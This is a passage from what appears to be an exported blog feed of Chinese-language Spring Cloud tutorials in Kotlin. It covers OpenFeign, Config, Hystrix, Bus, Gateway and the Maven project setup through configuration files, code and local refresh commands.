&lt;dependencies&gt;        &lt;dependency&gt;            &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt;            &lt;artifactId&gt;spring-cloud-starter-openfeign&lt;/artifactId&gt;        &lt;/dependency&gt;        &lt;dependency&gt;            &lt;!--            引入自己的api通用包--&gt;            &lt;groupId&gt;top.zfxt.springcloud&lt;/groupId&gt;            &lt;artifactId&gt;cloud-api-commons&lt;/artifactId&gt;            &lt;version&gt;$&#123;project.version&#125;&lt;/version&gt;        &lt;/dependency&gt;        &lt;!-- https://mvnrepository.com/artifact/org.jetbrains.kotlin/kotlin-reflect --&gt;        &lt;dependency&gt;            &lt;groupId&gt;org.jetbrains.kotlin&lt;/groupId&gt;            &lt;artifactId&gt;kotlin-reflect&lt;/artifactId&gt;            &lt;version&gt;1.9.0&lt;/version&gt;            &lt;scope&gt;runtime&lt;/scope&gt;        &lt;/dependency&gt;        &lt;!-- https://mvnrepository.com/artifact/org.springframework.boot/spring-boot-starter-web --&gt;        &lt;dependency&gt;            &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;            &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt;            &lt;!-- 这样排除依赖会导致下图所示的问题 --&gt;            &lt;exclusions&gt;                &lt;exclusion&gt;                    &lt;groupId&gt;com.fasterxml.jackson.core&lt;/groupId&gt;                    &lt;artifactId&gt;jackson-databind&lt;/artifactId&gt;                &lt;/exclusion&gt;            &lt;/exclusions&gt;        &lt;/dependency&gt;        &lt;!--         Gson--&gt;        &lt;dependency&gt;            &lt;groupId&gt;com.google.code.gson&lt;/groupId&gt;            &lt;artifactId&gt;gson&lt;/artifactId&gt;        &lt;/dependency&gt;        &lt;!--        eureka客户端--&gt;        &lt;dependency&gt;            &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt;            &lt;artifactId&gt;spring-cloud-starter-netflix-eureka-client&lt;/artifactId&gt;        &lt;/dependency&gt;        &lt;!-- https://mvnrepository.com/artifact/org.springframework.boot/spring-boot-starter-web --&gt;        &lt;dependency&gt;            &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;            &lt;artifactId&gt;spring-boot-starter-actuator&lt;/artifactId&gt;        &lt;/dependency&gt;
YML
server:  port: 80spring:  application:    name: cloud-consumer-servereureka:  client:    service-url:      defaultZero: http://localhost:7001/eureka,http://localhost:7002/eureka

主启动
@SpringBootApplication(exclude = [JacksonAutoConfiguration::class])@EnableFeignClientsopen class OrderFeignMain80fun main(args: Array&lt;String&gt;) &#123;    runApplication&lt;OrderFeignMain80&gt;(*args)&#125;

业务类直接定义PaymentFeignService接口。然后写方法体即可。
@Component@FeignClient(&quot;CLOUD-PAYMENT-SERVICE&quot;)interface PaymentFeignService &#123;    @GetMapping(&quot;/payment/get/&#123;id&#125;&quot;)    fun getPaymentById(@PathVariable(&quot;id&quot;) id: Long): CommonResult&lt;*&gt;&#125;
Controller
@RestControllerclass OrderFeignController &#123;    @Resource    private lateinit var paymentFeignService: PaymentFeignService    @GetMapping(&quot;/get/&#123;id&#125;&quot;)    fun getPaymentById(@PathVariable(&quot;id&quot;) id:Long): CommonResult&lt;Payment&gt; &#123;        return paymentFeignService.getPaymentById(id)    &#125;&#125;



超时控制OpenFeign默认等待一秒钟，超过一秒钟读取的都算是超时的。超过既报错而控制他的超时时间是由Ribbon来决定的。看到application.yml：
server:  port: 80spring:  application:    name: cloud-consumer-servereureka:  client:    serviceUrl:      #      defaultZone: http://localhost:7001/eureka      defaultZone: http://eureka7001.com:7001/eureka,http://eureka7002.com:7002/eureka # 集群版feign:  client:    config:      default:        # 连接超时时间，默认2s，设置单位为毫秒        connectTimeout: 8000        # 请求处理超时时间，默认5s，设置单位为毫秒。        readTimeout: 10000


日志打印功能日志级别NONE:默认的，不显示任何日志；BASIC:仅记录请求方法、URL、响应状态码及执行时间；HEADERS:除了BASIC中定义的信息之外，还有请求和响应的头信息；FULL:除了HEADERS中定义的信息之外，还有请求和响应的正文及元数据。
配置：
package top.zfxt.springcloud.configimport feign.Loggerimport org.springframework.context.annotation.Beanimport org.springframework.context.annotation.Configuration/** *  @author:zfxt *  @version:1.0 */@Configurationopen class FeignConfig &#123;    @Bean    open fun  feighLoggerLevel():Logger.Level&#123;        return Logger.Level.FULL    &#125;&#125;

添加到启动的配置项中
logging:  level:    # feigh日志以什么级别监控哪个接口    top.zfxt.springcloud.service.PaymentFeighService: debug]]></content>
      <categories>
        <category>springcloud</category>
      </categories>
      <tags>
        <tag>SpringCloud</tag>
      </tags>
  </entry>
  <entry>
    <title>SpringCloud(7)</title>
    <url>/posts/57dafa86/</url>
    <content><![CDATA[Config微服务意味着要将单体应用中的业务拆分成一个个子服务，每个服务的粒度相对较小，因此系统中会出现大量的服务。由于每个服务都需要必要的配置信息才能运行，所以一套集中式的动态的配置管理设施是必不可少的。
spring configServer就可以解决这个问题将相同的配置抽调出来放于ConfigServer中去解决。
服务端使用configServer通常与git，github相结合，通过在git上修改配置文件，从而让每个客户端自己读取到新的配置文件而不用重启。

现在GitHub上建立一个新仓库，这个仓库作为以后会使用到的配置文件中心
然后是构建服务端（module，pom，yml，主启动类，业务）以下是一些相关的包&lt;dependencies&gt;        &lt;dependency&gt;            &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt;            &lt;artifactId&gt;spring-cloud-config-server&lt;/artifactId&gt;        &lt;/dependency&gt;        &lt;dependency&gt;            &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;            &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt;        &lt;/dependency&gt;        &lt;dependency&gt;            &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;            &lt;artifactId&gt;spring-boot-starter-actuator&lt;/artifactId&gt;        &lt;/dependency&gt;    &lt;/dependencies&gt;
配置ymlserver:  port: 3344spring:  application:    name: cloud-config-center # 注册进Eureka服务器的微服务名  cloud:    config:      server:        git:          uri: https://github.com/zfx-t/springcloud-config.git          search-paths:            - springcloud-config        #### 搜索目录      label: maineureka:  client:    service-url:      defaultZone: http://localhost:7001/eureka
设置主启动类@SpringBootApplication@EnableConfigServeropen class Center3344 &#123;&#125;fun main(args:Array&lt;String&gt;)&#123;    runApplication&lt;Center3344&gt;(*args)&#125;

配置读取规则可以通过http://config-3344.com:3344/master/config-dev.yml来读取到信息服务端也被称为分布式配置中心，他是一个独立的微服务应用
客户端5大操作pom修改：
&lt;dependencies&gt;        &lt;dependency&gt;            &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;            &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt;        &lt;/dependency&gt;        &lt;dependency&gt;            &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;            &lt;artifactId&gt;spring-boot-starter-actuator&lt;/artifactId&gt;        &lt;/dependency&gt;        &lt;dependency&gt;            &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt;            &lt;artifactId&gt;spring-cloud-starter-config&lt;/artifactId&gt;        &lt;/dependency&gt;        &lt;dependency&gt;            &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt;            &lt;artifactId&gt;spring-cloud-starter-netflix-eureka-client&lt;/artifactId&gt;        &lt;/dependency&gt;    &lt;/dependencies&gt;
这里不再写application.yml而是使用bootstrap.ymlapplicaiton.yml是用户级的资源配置项bootstrap.yml是系统级的，优先级更加高

Spring Cloud会创建一个“Bootstrap Context”,作为Spring应用的Application Context的父上下文。初始化的时候，Bootstrap Context负责从外部源加载配置属性并解析配置。这两个上下文共享一个从外部获取的Environment。Bootstrap属性有高优先级，默认情况下，它们不会被本地配置覆盖。Bootstrap context和Application Context有着不同的约定所以新增了一个bootstrap.yml文件，保证Bootstrap Context和Application Context配置的分离。

server:  port: 3355spring:  application:    name: config-client  cloud:    #Config客户端配置    config:      label: master  #分支名称      name: config  #配置文件名称      profile: dev #读取后缀名称上述3个综合：master分支上config-dev.ymL的配置文件被读http://config-3344.com:3344/master/config-dev.yml      uri: http://localhost:3344  #配置中心地k#服务注册到eureka地址eureka:  client:    service-url:      defaultZone: http://localhost:7001/eureka

主启动类：
@SpringBootApplication@EnableEurekaClientopen class Client3355 &#123;&#125;fun main(args: Array&lt;String&gt;) &#123;    runApplication&lt;Client3355&gt;(*args)&#125;
业务类：
@RestControllerclass ConfigClientController &#123;    @Value(&quot;\$&#123;config.info&#125;&quot;)    private lateinit var configInfo:String    @GetMapping(&quot;/configInfo&quot;)    fun getConfigInfo(): String &#123;        return configInfo    &#125;&#125;
动态刷新问题实时更新gitee上的内容后，需要服务器自动去更新内容，并完成所有客户端的自动更新。

修改客户端模块-. pom引入actuator监控&lt;dependency&gt;            &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;            &lt;artifactId&gt;spring-boot-starter-actuator&lt;/artifactId&gt;        &lt;/dependency&gt;
-. 修改yml，暴露监控端点# 暴露监控端点management:  endpoints:    web:      exposure:        include: &quot;*&quot;
-. 业务类添加@RefreshScope注解-. 然后要依赖于运维业务人员人为的给客户端发送一个刷新的post请求必须是POST请求curl -X POST “http://localhost:3355/actuator/refresh“

]]></content>
      <categories>
        <category>springcloud</category>
      </categories>
  </entry>
  <entry>
    <title>SpringCloud(5)</title>
    <url>/posts/65ec9804/</url>
    <content><![CDATA[服务降级
服务雪崩多个微服务之间调用的时候，假设微服务A调用微服务B和微服务C,微服务B和微服务C又调用其它的微服务，这就是所谓的“扇出”如果扇出的链路上某个微服务的调用响应时间过长或者不可用，对微服务A的调用就会占用越来越多的系统资源，进而引起系统崩溃，所谓的“雪崩效应”.对于高流量的应用来说，单一的后端依赖可能会导致所有服务器上的所有资源都在几秒钟内饱和。比失败更糟糕的是，这些应用程序还可能导致服务之间的延迟增加，备份队列，线程和其他系统资源紧张，导致整个系统发生更多的级联故障。这些都表示需要对故障和延迟进行隔离和管理，以便单个依赖关系的失败，不能取消整个应用程序或系统。

HystrixHystrix是一个用于处理分布式系统的延迟和容错的开源库，在分布式系统里，许多依赖不可避免的会调用失败，比如超时、异常等，Hystrix能够保证在一个依赖出问题的情况下，不会导致整体服务失败，避免级联故障，以提高分布式系统的弹性。“断路器”本身是一种开关装置，当某个服务单元发生故障之后，通过断路器的故障监控（类以熔断保险丝），向调用方返回一个符合预期的、可处理的备选响应(FallBack)，而不是长时间的等待或者抛出调用方无法处理的异常，这样就保证了服务调用方的线程不会被长时间、不必要地占用，从而避免了故障在分布式系统中的蔓延，乃至雪崩。
使用hystrix既可以使用在消费侧，也可以使用在服务侧首先要导包：
&lt;dependency&gt;            &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt;            &lt;artifactId&gt;spring-cloud-starter-netflix-hystrix&lt;/artifactId&gt;        &lt;/dependency&gt;

服务降级(fallback)立即返回一个表示服务出错的响应-. 给服务端(生产者)进行配置

主启动类激活：@EnableCircuitBreakeropen class PaymentHystrixMain8001
给服务类添加注解和配置：@HystrixCommand(        commandProperties = [            HystrixProperty(name=&quot;execution.timeout.enabled&quot;, value=&quot;true&quot;),            HystrixProperty(name=&quot;execution.isolation.thread.timeoutInMilliseconds&quot;, value=&quot;3000&quot;),        ],        fallbackMethod = &quot;error_handle&quot;)    open fun paymentInfo_TimeOut(id:Int):String&#123;        try &#123;            Thread.sleep(3000)        &#125;catch (e:InterruptedException)&#123;            e.printStackTrace()        &#125;        return &quot;线程池：$&#123;Thread.currentThread().name&#125; paymentInfo_TimeOut,id:$&#123;id&#125;\t. 耗时3秒钟&quot;    &#125;     open fun error_handle(id:Int):String&#123;        return &quot;出错了呢&quot;    &#125;

-. 给客户端(消费者)进行配置首先配置yml：
feign:  hystrix:    enabled: true
主启动类开启注解：
@EnableHystrix
然后为他的controller类添加上注解和错误解决方法：
@HystrixCommand(        commandProperties = [            HystrixProperty(name=&quot;execution.timeout.enabled&quot;, value=&quot;true&quot;),            HystrixProperty(name=&quot;execution.isolation.thread.timeoutInMilliseconds&quot;, value=&quot;3000&quot;),        ],        fallbackMethod = &quot;error_handle&quot;)    open fun paymentInfo_TimeOut(id:Int):String&#123;        try &#123;            Thread.sleep(3000)        &#125;catch (e:InterruptedException)&#123;            e.printStackTrace()        &#125;        return &quot;线程池：$&#123;Thread.currentThread().name&#125; paymentInfo_TimeOut,id:$&#123;id&#125;\t. 耗时3秒钟&quot;    &#125;    open fun error_handle(id:Int):String&#123;        return &quot;出错了呢&quot;    &#125;

解决代码膨胀问题如果每个方法都需要一个fallback解决方法。那么就会导致代码过于繁多。不利于查看。

全局配置一个fallback方法。在需要处理的业务类上加上注解@RestController@DefaultProperties(defaultFallback = &quot;global_error_handle&quot;)open class PaymentController 
如果具体的方法中没有标明fallback方法，那么就会找全局的fallback方法。否则就选择就近的fallback方法。但是这样子也会面临一些代码耦合度高的问题，需要去解耦。常见的三个服务器问题：运行，超时，宕机新的解决方法。不在业务层中进行修改。而是在service层中修改。这样子可以更好的解耦合。
定义一个类实现这个service接口：@Componentclass PaymentFallbackService: PaymentService &#123;    override fun paymentInfo_OK(id: Int): String &#123;        return &quot;paymentInfo_OK-------paymentFallbackService fallback-------&quot;    &#125;    override fun paymentInfo_TimeOut(id: Int): String &#123;        return &quot;paymentInfo_TimeOut-------paymentFallbackService fallback-------&quot;    &#125;&#125;
然后配置yaml选项，开启配置：feign:  hystrix:    enabled: true
设置统一的fallback。@Component@FeignClient(&quot;CLOUD-PROVIDER-SERVICE&quot;, fallback = PaymentFallbackService::class)
然后测试

服务熔断(break)即保险丝的意思熔断机制概述熔断机制是应对雪崩效亚的一种微服务链路保护机制。当扇出链路的某个微服务出错不可用或者响应时间太长时，会进行服务的降级，进而熔断该节点微服务的调用，快速返回错误的响应信息。当检测到该节点微服务调用响应正常后，恢复调用链路。在Spring Cloud框架里，熔断机制通过Hystrix3实现。Hystrix会监控微服务间调用的状况，当失败的调用到一定阈值，缺省是5秒内20次调用失败，就会启动熔断机制。熔断机制的注解是@HystrixCommand。配置8001支付模块Service中的熔断器：
//=====服务熔断    @HystrixCommand(        fallbackMethod = &quot;paymentCircuitBreaker_fallback&quot;,        commandProperties = [            HystrixProperty(name = &quot;circuitBreaker.enabled&quot;, value = &quot;true&quot;),//是否开启断路器            HystrixProperty(name = &quot;circuitBreaker.requestVolumeThreshold&quot;, value = &quot;10&quot;),//请求次数            HystrixProperty(name = &quot;circuitBreaker.sleepWindowInMilliseconds&quot;, value = &quot;10000&quot;),//时间窗口期            HystrixProperty(name = &quot;circuitBreaker.errorThresholdPercentage&quot;, value = &quot;60&quot;),//失败率达到多少后跳闸        ]    )    open fun paymentCircuitBreaker(@PathVariable(&quot;id&quot;) id: Int): String &#123;        if (id &lt; 0) &#123;            throw RuntimeException(&quot;*****id不能为负数&quot;)        &#125;        val serialNumber = IdUtil.simpleUUID()        return Thread.currentThread().name + &quot;调用成功,流水号：$serialNumber&quot;    &#125;    open fun paymentCircuitBreaker_fallback(@PathVariable(&quot;id&quot;) id: Int): String &#123;        return &quot;id不能为负数，请稍后重试:$id&quot;    &#125;
以下是controller的代码：
//===服务熔断    @GetMapping(        &quot;/payment/circuit/&#123;id&#125;&quot;    )    fun paymentcircuitBreaker(@PathVariable(&quot;id&quot;) id:Int): String &#123;        var result = paymentService.paymentCircuitBreaker(id);        log.info(&quot;****result:&quot; + result);        return result;    &#125;
通过访问这个端口，然后实现服务熔断
服务限流(flowlimit)
hystrix仪表盘使用
建module

修改pom
&lt;dependency&gt;            &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt;            &lt;artifactId&gt;spring-cloud-starter-netflix-hystrix-dashboard&lt;/artifactId&gt;        &lt;/dependency&gt;	//提供监控信息        &lt;dependency&gt;            &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;            &lt;artifactId&gt;spring-boot-starter-actuator&lt;/artifactId&gt;        &lt;/dependency&gt;
关键是这个dashboard的包导入

设置yml。只设置端口即可。

主启动类以下是8001提供服务端，只有这样配置才能被找到
需要配置一些固定的内容(以下是8001的提供服务端，配置后才能被dashboard找到)@SpringBootApplication(exclude = [JacksonAutoConfiguration::class])@EnableEurekaClient@EnableCircuitBreakeropen class PaymentHystrixMain8001 &#123;    /**     *此配置是为了服务监控而配置，与服务容错本身无关，springcloud升级后的坑     *ServletRegistrationBean因为springboot的默认路径不是&quot;/hystrix.stream&quot;,     *只要在自己的项目里配置上下面的serv儿et就可以了     */    @Bean    open fun getServlet(): ServletRegistrationBean&lt;HystrixMetricsStreamServlet&gt; &#123;        var streamServlet: HystrixMetricsStreamServlet = HystrixMetricsStreamServlet();        var registrationBean = ServletRegistrationBean(streamServlet);        registrationBean.setLoadOnStartup(1);        registrationBean.addUrlMappings(&quot;/hystrix.stream&quot;);        registrationBean.setName(&quot;HystrixMetricsstreamServlet&quot;);        return registrationBean;    &#125;&#125;    fun main(args: Array&lt;String&gt;) &#123;        runApplication&lt;PaymentHystrixMain8001&gt;(*args)    &#125;

]]></content>
      <categories>
        <category>springcloud</category>
      </categories>
      <tags>
        <tag>SpringCloud</tag>
      </tags>
  </entry>
  <entry>
    <title>SpringCloud(8)</title>
    <url>/posts/d042e649/</url>
    <content><![CDATA[Bus消息总线可以和消息队列（rabbitmq或kafuf）整合
安装rabbitmq可以查看我的这篇文章rabbitmq入门
springcloud 全局广播通知
先安装3355的客户端配置在配置一个3366的客户端

直接通知configServer服务中心，让所有从此获取config的微服务都得到通知
服务端添加消息总线的支持pom：&lt;dependency&gt;&lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt;&lt;artifactId&gt;spring-cloud-starter-bus-amqp&lt;/artifactId&gt;&lt;/dependency&gt;
ymlserver:  port: 3344spring:  application:    name: cloud-config-center # 注册进Eureka服务器的微服务名  cloud:    config:      server:        git:          uri: https://gitee.com/zfx-t/springcloud-config.git          search-paths:            - springcloud-config        #### 搜索目录      label: master  rabbitmq:    host: localhost    port: 5672    username: admin    password: 123## rabbitmq相关配置，暴爵bus刷断配置的端点management:  endpoints:  #暴露bus刷断配置的端，点    web:      exposure:        include: &#x27;bus-refresh&#x27;eureka:  client:    service-url:      defaultZone: http://localhost:7001/eureka
客户端添加总线支持pom：&lt;dependency&gt;            &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt;            &lt;artifactId&gt;spring-cloud-starter-bus-amqp&lt;/artifactId&gt;        &lt;/dependency&gt;
yml:# 添加rabbitmq配置在spring下面：  rabbitmq:    host: localhost    port: 5672    username: admin    password: 123

此时已经配置完成，只需要修改配置后，运维工程师向3344发送一个refresh请求，就会让所有的子微服务得到刷新curl -X POST http://localhost:3344/actuator/bus-refresh
定点通知，只通知一个服务更新，其他的不更新
通知单个微服务，然后广播其他微服务程序（不建议这样使用，会增加每个微服务的职责，还需要额外的消息通知功能）]]></content>
      <categories>
        <category>springcloud</category>
      </categories>
  </entry>
  <entry>
    <title>Springcloud(6)</title>
    <url>/posts/b7b7a991/</url>
    <content><![CDATA[路由网关Gateway
动嘴，理论。动手，架构

SpringCloud Gateway使用的Webflux中的reactor-netty响应式编程组件，底层使用了netty通讯框架。基于NIO（异步非阻塞模型）

传统框架：structs2，springmvc都是基于servlet API和Servlet容器。也就是阻塞框架，而Servlet3.1后就有了异步非阻塞的支持，WebFlux就是一个典型非阻塞异步的框架。他的核心基于Reactor

3大核心：路由，断言，过滤

静态配置有两种方式：1，修改yml文件

建module
修改pom需要导入一些新的内容包：

&lt;dependencies&gt;        &lt;dependency&gt;            &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt;            &lt;artifactId&gt;spring-cloud-starter-gateway&lt;/artifactId&gt;        &lt;/dependency&gt;        &lt;dependency&gt;            &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt;            &lt;artifactId&gt;spring-cloud-starter-netflix-eureka-client&lt;/artifactId&gt;        &lt;/dependency&gt;        &lt;dependency&gt;            &lt;groupId&gt;top.zfxt.springcloud&lt;/groupId&gt;            &lt;artifactId&gt;cloud-api-commons&lt;/artifactId&gt;            &lt;version&gt;1.0-SNAPSHOT&lt;/version&gt;        &lt;/dependency&gt;    &lt;/dependencies&gt;

修改yml他主要就是eureka配置即可server:  port: 9527spring:  application:    name: cloud-gatewayeureka:  instance:    hostname: cloud-gateway-service  client:    service-url:      register-with-eureka: true      fetch-registry: true      defaultZone: http://eureka7001.com:7001/eureka
路由网关配置在application.yml中设置如下spring:  application:    name: cloud-gateway  cloud:    gateway:      routes:        - id: payment_routh #payment_route #路由的ID,没有固定规则但要求唯一，建议配合服务名          uri: http://localhost:8001 #匹配后提供服务的路由地址          predicates:            - Path=/payment/get/** #断言，路径相匹配的进行路由        - id: payment_routh2 #payment route #路由的ID,没有固定规则但要求唯一，建议配合服务名          uri: http://localhost:8001 #匹配后提供服务的路由地址          predicates:  #断言，路径相匹配的进行路由            - Path=/payment/lb/**
完成配置后，即可通过9527这个端口访问服务

第二种方式，添加一个配置项
在代码中注入RouteLocator的Bean

构建config类@Configurationopen class GatewayConfig &#123;    @Bean    open fun customRoutelocator(routeLocatorBuilder:RouteLocatorBuilder): RouteLocator? &#123;        val routes = routeLocatorBuilder.routes()        routes.route(&quot;path_route_baidu&quot;)&#123;            it.path(&quot;/guonei&quot;).uri(&quot;https://news.baidu.com/guonei&quot;)        &#125;.build()        return routes.build()    &#125;&#125;

动态配置允许利用注册中心动态创建路由
spring:  application:    name: cloud-gateway  cloud:    gateway:      discovery:        locator:          enabled: true # 允许利用注册中心动态创建路由      routes:        - id: payment_routh #payment_route #路由的ID,没有固定规则但要求唯一，建议配合服务名#          uri: http://localhost:8001 #匹配后提供服务的路由地址          uri: lb://CLOUD-PAYMENT-SERVICE          predicates:            - Path=/payment/get/** #断言，路径相匹配的进行路由        - id: payment_routh2 #payment route #路由的ID,没有固定规则但要求唯一，建议配合服务名#          uri: http://localhost:8001 #匹配后提供服务的路由地址          uri: lb://CLOUD-PAYMENT-SERVICE          predicates:  #断言，路径相匹配的进行路由            - Path=/payment/lb/**

predicates根据这个图示，可以分辨出他具有那些可选的配置项，包括Path等
filter路由过滤器可用于修改进入的HTTP请求和返回的HTTP响应，路由过滤器只能指定路由进行使用。自定义过滤器：需要实现两个接口。GlobalFilter，Ordered
val log: InfoLog = Log.get(InfoLog::class.java)@Componentopen class MyLogGlobalFilter : GlobalFilter, Ordered &#123;    override fun filter(exchange: ServerWebExchange?, chain: GatewayFilterChain?): Mono&lt;Void&gt; &#123;        log.info(&quot;*****************come in MyLogGlobalFilter*********************&quot;)        val name = exchange?.request?.queryParams?.getFirst(&quot;uname&quot;)        if (name == null) &#123;            log.info(&quot;**********用户名为非法null&quot;)            exchange!!.response.statusCode = HttpStatus.NOT_ACCEPTABLE            return exchange.response.setComplete()        &#125;        return chain!!.filter(exchange)    &#125;    //用来设置优先级,数据越小，优先级越高    override fun getOrder(): Int &#123;        return 0    &#125;&#125;]]></content>
      <categories>
        <category>springcloud</category>
      </categories>
      <tags>
        <tag>SpringCloud</tag>
      </tags>
  </entry>
  <entry>
    <title>SpringCloud框架学习(1)</title>
    <url>/posts/2440451f/</url>
    <content><![CDATA[微服务架构微服务架构就是将一个集中式的服务应用拆分成很多个小部分的应用。每个服务之间相互配合使用。SpringCloud&#x3D;分布式微服务架构的一站式解决方案，是多种微服务架构落地技术的集合体。俗称微服务全家桶
版本配合https://spring.io/projects/spring-cloud可以参照官网，因为cloud和boot的版本需要相互依赖，他们有版本的限制关系，如：也可以查看这个json格式表.他会推荐搭配的版本
关键组件
微服务工程的搭建
首先在idea中新建一个maven项目。
然后删除其中的src文件夹。只将其作为一个pom包
关键是pom.xml的配置&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;project xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;         xmlns=&quot;http://maven.apache.org/POM/4.0.0&quot;         xsi:schemaLocation=&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;&gt;    &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt;    &lt;artifactId&gt;cloud2020&lt;/artifactId&gt;    &lt;groupId&gt;top.zfxt.springcloud&lt;/groupId&gt;    &lt;version&gt;1.0-SNAPSHOT&lt;/version&gt;    &lt;packaging&gt;pom&lt;/packaging&gt;    &lt;name&gt;consoleApp&lt;/name&gt;    &lt;properties&gt;&lt;!--        统一jar包版本号--&gt;        &lt;project.build.sourceEncoding&gt;UTF-8&lt;/project.build.sourceEncoding&gt;        &lt;kotlin.code.style&gt;official&lt;/kotlin.code.style&gt;        &lt;kotlin.compiler.jvmTarget&gt;1.8&lt;/kotlin.compiler.jvmTarget&gt;        &lt;junit.version&gt;4.12&lt;/junit.version&gt;        &lt;log4j.version&gt;1.2.17&lt;/log4j.version&gt;        &lt;lombok.version&gt;1.16.18&lt;/lombok.version&gt;        &lt;mysql.version&gt;5.1.47&lt;/mysql.version&gt;        &lt;druid.version&gt;1.1.16&lt;/druid.version&gt;        &lt;mybatis.spring.boot.version&gt;1.3.0&lt;/mybatis.spring.boot.version&gt;    &lt;/properties&gt;    &lt;repositories&gt;        &lt;repository&gt;            &lt;id&gt;mavenCentral&lt;/id&gt;            &lt;url&gt;https://maven.aliyun.com/repository/public&lt;/url&gt;        &lt;/repository&gt;    &lt;/repositories&gt;    &lt;!-- 1、只是声明依赖，并不实际引入，子项目按需声明使用的依赖 --&gt;    &lt;!-- 2、子项目可以继承父项目的 version 和 scope --&gt;    &lt;!-- 3、子项目若指定了 version 和 scope，以子项目为准 --&gt;    &lt;!--    子模块继承后，提供作用：锁定版本+子module不用写groupID和version--&gt;    &lt;dependencyManagement&gt;        &lt;dependencies&gt;            &lt;dependency&gt;                &lt;groupId&gt;org.jetbrains.kotlin&lt;/groupId&gt;                &lt;artifactId&gt;kotlin-test-junit5&lt;/artifactId&gt;                &lt;version&gt;1.9.0&lt;/version&gt;                &lt;scope&gt;test&lt;/scope&gt;            &lt;/dependency&gt;            &lt;dependency&gt;                &lt;groupId&gt;org.junit.jupiter&lt;/groupId&gt;                &lt;artifactId&gt;junit-jupiter-engine&lt;/artifactId&gt;                &lt;version&gt;5.10.0&lt;/version&gt;                &lt;scope&gt;test&lt;/scope&gt;            &lt;/dependency&gt;            &lt;dependency&gt;                &lt;groupId&gt;org.jetbrains.kotlin&lt;/groupId&gt;                &lt;artifactId&gt;kotlin-stdlib&lt;/artifactId&gt;                &lt;version&gt;1.9.0&lt;/version&gt;            &lt;/dependency&gt;            &lt;!--spring boot 2.2.2--&gt;            &lt;dependency&gt;                &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;                &lt;artifactId&gt;spring-boot-dependencies&lt;/artifactId&gt;                &lt;version&gt;2.2.2.RELEASE&lt;/version&gt;                &lt;type&gt;pom&lt;/type&gt;                &lt;scope&gt;import&lt;/scope&gt;            &lt;/dependency&gt;            &lt;!--spring cloud Hoxton.SR1--&gt;            &lt;dependency&gt;                &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt;                &lt;artifactId&gt;spring-cloud-dependencies&lt;/artifactId&gt;                &lt;version&gt;Hoxton.SR1&lt;/version&gt;                &lt;type&gt;pom&lt;/type&gt;                &lt;scope&gt;import&lt;/scope&gt;            &lt;/dependency&gt;            &lt;!--spring cloud alibaba 2.1.0.RELEASE--&gt;            &lt;dependency&gt;                &lt;groupId&gt;com.alibaba.cloud&lt;/groupId&gt;                &lt;artifactId&gt;spring-cloud-alibaba-dependencies&lt;/artifactId&gt;                &lt;version&gt;2.1.0.RELEASE&lt;/version&gt;                &lt;type&gt;pom&lt;/type&gt;                &lt;scope&gt;import&lt;/scope&gt;            &lt;/dependency&gt;            &lt;dependency&gt;                &lt;groupId&gt;mysql&lt;/groupId&gt;                &lt;artifactId&gt;mysql-connector-java&lt;/artifactId&gt;                &lt;version&gt;$&#123;mysql.version&#125;&lt;/version&gt;            &lt;/dependency&gt;            &lt;dependency&gt;                &lt;groupId&gt;com.alibaba&lt;/groupId&gt;                &lt;artifactId&gt;druid&lt;/artifactId&gt;                &lt;version&gt;$&#123;druid.version&#125;&lt;/version&gt;            &lt;/dependency&gt;            &lt;dependency&gt;                &lt;groupId&gt;org.mybatis.spring.boot&lt;/groupId&gt;                &lt;artifactId&gt;mybatis-spring-boot-starter&lt;/artifactId&gt;                &lt;version&gt;$&#123;mybatis.spring.boot.version&#125;&lt;/version&gt;            &lt;/dependency&gt;            &lt;dependency&gt;                &lt;groupId&gt;junit&lt;/groupId&gt;                &lt;artifactId&gt;junit&lt;/artifactId&gt;                &lt;version&gt;$&#123;junit.version&#125;&lt;/version&gt;            &lt;/dependency&gt;            &lt;dependency&gt;                &lt;groupId&gt;log4j&lt;/groupId&gt;                &lt;artifactId&gt;log4j&lt;/artifactId&gt;                &lt;version&gt;$&#123;log4j.version&#125;&lt;/version&gt;            &lt;/dependency&gt;            &lt;dependency&gt;                &lt;groupId&gt;org.projectlombok&lt;/groupId&gt;                &lt;artifactId&gt;lombok&lt;/artifactId&gt;                &lt;version&gt;$&#123;lombok.version&#125;&lt;/version&gt;                &lt;optional&gt;true&lt;/optional&gt;            &lt;/dependency&gt;        &lt;/dependencies&gt;    &lt;/dependencyManagement&gt;    &lt;build&gt;        &lt;sourceDirectory&gt;src/main/kotlin&lt;/sourceDirectory&gt;        &lt;testSourceDirectory&gt;src/test/kotlin&lt;/testSourceDirectory&gt;        &lt;plugins&gt;            &lt;plugin&gt;                &lt;groupId&gt;org.jetbrains.kotlin&lt;/groupId&gt;                &lt;artifactId&gt;kotlin-maven-plugin&lt;/artifactId&gt;                &lt;version&gt;1.9.0&lt;/version&gt;                &lt;executions&gt;                    &lt;execution&gt;                        &lt;id&gt;compile&lt;/id&gt;                        &lt;phase&gt;compile&lt;/phase&gt;                        &lt;goals&gt;                            &lt;goal&gt;compile&lt;/goal&gt;                        